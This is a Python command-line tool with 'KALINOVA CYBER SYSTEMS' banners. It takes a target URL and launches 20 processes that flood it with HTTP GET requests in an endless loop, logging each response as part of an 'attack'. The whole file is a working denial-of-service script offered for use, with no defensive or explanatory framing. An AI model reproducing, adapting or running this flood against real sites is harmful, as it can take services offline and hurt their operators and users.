import requests
import multiprocessing
import random
import time
import urllib.parse
from colorama import init, Fore

init()

P = Fore.MAGENTA
G = Fore.GREEN
R = Fore.RED
Y = Fore.YELLOW
C = Fore.CYAN
RES = Fore.RESET

def show_banner():
    print(P + r"""
  ██╗  ██╗ █████╗ ██╗     ██╗    ███╗   ██╗ ██████╗ ██╗   ██╗
  ██║ ██╔╝██╔══██╗██║     ██║    ████╗  ██║██╔═══██╗██║   ██║
  █████╔╝ ███████║██║     ██║    ██╔██╗ ██║██║   ██║██║   ██║
  ██╔═██╗ ██╔══██║██║     ██║    ██║╚██╗██║██║   ██║██║   ██║
  ██║  ██╗██║  ██║███████╗███████╗██║ ╚████║╚██████╔╝╚██████╔╝
  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ 
  """ + RES)

    print(C + r"""
   ▄████████  ▄██████▄     ▄████████    ▄████████ 
  ███    ███ ███    ███   ███    ███   ███    ███ 
  ███    █▀  ███    ███   ███    ███   ███    █▀  
  ███        ███    ███  ▄███▄▄▄▄██▀  ▄███▄▄▄     
▀███████████ ███    ███ ▀▀███▀▀▀▀▀   ▀▀███▀▀▀     
         ███ ███    ███ ▀███████████   ███    █▄  
   ▄█    ███ ███    ███   ███    ███   ███    ███ 
 ▄████████▀   ▀██████▀    ███    ███   ██████████ 
                          ███    ███              
  """ + RES)

    print(Y + "═"*60 + RES)
    print(P + " "*20 + "KALINOVA CYBER SYSTEMS" + " "*20 + RES)
    print(G + " "*23 + "DEV: @MAKTPAXEP_KAPAMElKA" + " "*23 + RES)
    print(Y + "═"*60 + RES + "\n")


def attack(target_url, method='GET', num_cycles=1, min_rate_mbps=10, max_rate_mbps=74):
    parsed_url = urllib.parse.urlparse(target_url)
    scheme = parsed_url.scheme
    host = parsed_url.netloc
    path = parsed_url.path if parsed_url.path else "/"

    if scheme == "https":
        port = 443
    elif scheme == "http":
        port = 80
    else:
        print(R + f"[-] Unsupported scheme: {scheme}" + RES)
        return

    try:
        min_rate_bytes = min_rate_mbps * 1024 * 1024 / 8
        max_rate_bytes = max_rate_mbps * 1024 * 1024 / 8

        for cycle in range(num_cycles):
            while True:
                target_rate = random.uniform(min_rate_bytes, max_rate_bytes)
                packet_size = 1460
                time_to_send = packet_size / target_rate

                try:
                    response = requests.request(method, f"{scheme}://{host}:{port}{path}", timeout=5) # Добавлен таймаут
                    print(G + f"[+] Sent {method} request to {host}:{port}{path}, status code: {response.status_code}" + RES)
                    time.sleep(time_to_send)
                except requests.exceptions.RequestException as e:
                    print(R + f"[-] Request error: {e}" + RES)
                    #continue # Продолжаем цикл, несмотря на ошибку
                except KeyboardInterrupt:
                    print(R + "\n[!] Attack stopped by user" + RES)
                    return  # Выходим из функции при прерывании
                except Exception as e:
                  print(R + f"[-] General error: {e}" + RES)
                continue
            else:
              continue
            break

        print(G + f"[+] Attack finished on {host}:{port}{path} after {num_cycles} cycles" + RES)

    except Exception as e:
        print(R + f"[-] Error: {e}" + RES)

if __name__ == "__main__":
    show_banner()
    target_url = input(P + "[?] Enter target URL (http:// or https://): " + RES)
    num_processes = 20
    num_cycles_per_process = 1
    min_rate_mbps = 10
    max_rate_mbps = 74

    processes = []
    try:
        for i in range(num_processes):
            process = multiprocessing.Process(target=attack, args=(target_url, "GET", num_cycles_per_process, min_rate_mbps, max_rate_mbps))
            processes.append(process)
            process.start()

        for process in processes:
            process.join()
    except KeyboardInterrupt:
        print(R + "\n[!] Attack stopped by user" + RES)
        for process in processes:
            process.terminate()
            process.join()

    print(G + "[+] All processes finished" + RES)
    time.sleep(0.001)
